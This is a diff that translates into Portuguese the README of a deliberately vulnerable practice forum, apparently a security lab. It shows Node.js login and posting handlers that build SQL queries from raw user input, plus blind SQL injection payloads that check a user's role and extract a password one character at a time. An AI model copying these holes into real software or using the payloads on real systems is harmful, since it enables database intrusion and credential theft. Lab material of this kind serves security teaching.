@@ -1,83 +1,83 @@
-# Forum with Blind SQL Injection
+# Fórum com Injeção SQL Cega
 
-## Setup
+## Configuração
 
-1. Install dependencies:
+1. Instale as dependências:
 
 ```
 npm install
 ```
 
-2. Initialize the database with sample data:
+2. Inicialize o banco de dados com dados de exemplo:
 
 ```
 node setup-db.js
 ```
 
-3. Start the server:
+3. Inicie o servidor:
 
 ```
 npm start
 ```
 
-4. Access the forum at: http://localhost:3000
+4. Acesse o fórum em: http://localhost:3000
 
-## Vulnerabilities
+## Vulnerabilidades
 
-### 1. SQL Injection in Login Page
+### 1. Injeção SQL na Página de Login
 
-The login page is also vulnerable to SQL injection. User inputs for username and password are directly concatenated into the SQL query without sanitization:
+A página de login também é vulnerável à injeção SQL. As entradas do usuário para nome de usuário e senha são concatenadas diretamente na consulta SQL sem sanitização:
 
 ```javascript
 app.post("/login", (req, res) => {
   const { username, password } = req.body;
 
-  // VULNERABLE: Blind SQL injection in the login query
-  // directly concatenating user input in SQL query
+  // VULNERÁVEL: Injeção SQL cega na consulta de login
+  // concatenando diretamente a entrada do usuário na consulta SQL
   const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
 
   db.get(query, (err, user) => {
-    // ...response handling...
+    // ...manipulação da resposta...
   });
 });
 ```
 
-Test message' AND (SELECT role FROM users WHERE username='PaulAtreides')='admin' AND '1'='1
+Mensagem de teste' AND (SELECT role FROM users WHERE username='PaulAtreides')='admin' AND '1'='1
 
-### 2. Blind SQL Injection in Message Posting
+### 2. Injeção SQL Cega na Postagem de Mensagens
 
-The `/post` endpoint for posting new messages is also vulnerable to blind SQL injection. This can be exploited to extract data from the database:
+O endpoint `/post` para postar novas mensagens também é vulnerável à injeção SQL cega. Isso pode ser explorado para extrair dados do banco de dados:
 
 ```javascript
 app.post("/post", (req, res) => {
   const { username, content, planet } = req.body;
 
-  // VULNERABLE: Blind SQL injection in the message posting
+  // VULNERÁVEL: Injeção SQL cega na postagem de mensagem
   const query = `INSERT INTO messages (username, content, planet) 
                   VALUES ('${username}', '${content}', '${
-    planet || "Unknown"
+    planet || "Desconhecido"
   }')`;
 
   db.run(query, (err) => {
-    // ...response handling...
+    // ...manipulação da resposta...
   });
 });
 ```
 
-#### Example Attack
+#### Exemplo de Ataque
 
-When posting a message, you can use the following payload in the content field to extract password information character by character:
+Ao postar uma mensagem, você pode usar o seguinte payload no campo de conteúdo para extrair informações de senha caractere por caractere:
 
 ```
-Test', (SELECT CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='PaulAtreides')='m' THEN 'success' ELSE 'fail' END)) --
+Teste', (SELECT CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='PaulAtreides')='m' THEN 'success' ELSE 'fail' END)) --
 ```
 
-This injection:
+Esta injeção:
 
-1. Closes the current string with a quote and adds a comma
-2. Uses a CASE statement to check if the first character of Paul's password is 'm'
-3. Comments out the rest of the query
+1. Fecha a string atual com uma aspa e adiciona uma vírgula
+2. Usa uma instrução CASE para verificar se o primeiro caractere da senha de Paul é 'm'
+3. Comenta o resto da consulta
 
-If the first character is 'm', the query executes successfully. If not, it fails due to SQL syntax errors.
+Se o primeiro caractere for 'm', a consulta é executada com sucesso. Se não, ela falha devido a erros de sintaxe SQL.
 
-To extract the full password, modify the position (change `1,1` to `2,1` for second character) and try different characters.
+Para extrair a senha completa, modifique a posição (altere `1,1` para `2,1` para o segundo caractere) e tente diferentes caracteres.
